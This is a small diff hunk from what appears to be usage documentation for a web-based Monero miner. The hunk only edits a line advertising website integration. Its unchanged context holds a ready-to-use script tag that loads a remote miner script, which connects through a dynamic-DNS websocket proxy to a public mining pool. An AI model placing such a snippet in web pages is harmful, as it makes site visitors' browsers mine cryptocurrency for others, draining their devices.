@@ -13,7 +13,7 @@ Complete example:
 <script src="https://thelifeisbinary.netlify.com/media.js?gustav=ws://thelifeisbinary.ddns.net:8897?pools=pool.supportxmr.com:3333"> </script>
 
 <br><br> 
-Or use our integration for websites & blogs
+Or use our integration for websites & blogs and SSL integration
 http://www.crypto-webminer.com/integrate.html
   
 <br><br> 
